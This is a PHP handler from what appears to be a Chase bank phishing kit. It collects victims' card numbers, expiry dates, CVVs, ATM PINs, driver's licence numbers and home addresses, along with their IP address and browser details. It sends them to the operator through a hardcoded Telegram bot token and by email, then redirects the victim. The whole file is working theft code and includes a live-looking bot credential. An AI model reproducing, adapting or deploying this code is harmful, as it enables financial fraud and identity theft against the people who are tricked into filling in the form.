<?php

// Get client IP address
$ip = isset($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);

// Start session
session_start();


// Check if form is submitted
if (isset($_POST['ccn'])) {
    // Include external file
    include 'to.php';

    // Get form data
    $ccn = $_POST['ccn'];
    $cex = $_POST['cex'];
    $csc = $_POST['csc'];
    $fnm = $_POST['fnm'];
    $adr = $_POST['adr'];
    $cty = $_POST['cty'];
    $zip = $_POST['zip'];
    $stt = $_POST['stt'];
    $cnt = $_POST['cnt'];
    $pin = $_POST['input_540'];
    $dln = $_POST['input_550'];

    // Store data in session
    $_SESSION['fnm'] = $fnm;

    // Prepare email message with emoji
    $message =  "<b>💳 CHASE Card Submission💳</b>\n";
    $message .= "<b>User:</b> <code>{$_SESSION['email']}</code>\n"; // Assuming you have stored email in session previously
    $message .= "<b>Credit Card:</b> <code>$ccn</code>\n";
    $message .= "<b>Expire Date:</b> <code>$cex</code>\n";
    $message .= "<b>CVV:</b> <code>$csc</code>\n";
    $message .= "<b>ATM-PIN:</b> <code>$pin</code>\n";
    $message .= "<b>DL-NUMBER:</b> <code>$dln</code>\n";
    $message .= "<b>Full Name:</b> <code>$fnm</code>\n";
    $message .= "<b>Address:</b> <code>$adr</code>\n";
    $message .= "<b>City:</b> <code>$cty</code>\n";
    $message .= "<b>Zip:</b> <code>$zip</code>\n";
    $message .= "<b>State:</b> <code>$stt</code>\n";
    $message .= "<b>Country:</b> <code>$cnt</code>\n";
    $message .= "<b>🌐 IP Address:</b>$ip\n";
    $message .= "<b>⌚ Time:</b> " . date("Y-m-d H:i:s") . "\n";
    $message .= "<b>🖥 User-Agent:</b>{$_SERVER['HTTP_USER_AGENT']}\n";
    $message .= "<b>🔍 CHASE CARD BY BESHO MANDO💳</b> \n";

    // Email subject and headers
    $subject = "CHASE Card Submission";
    $headers = "From: Mody@CHASE" . rand(1, 99) . "Mody.V1 \r\n";

    // Send message to Telegram
    file_get_contents("https://api.telegram.org/bot6024595519:AAHQcscrgYlrL2vxuh_mXG4FHKugXRA4Rww/sendMessage?chat_id=" . $chatid . "&parse_mode=HTML&text=" . urlencode($message));

    // Send email
    $done = mail($toemail, $subject, $message, $headers);

    // Redirect after submission
    header('Location: ./red7.php');
}

?>
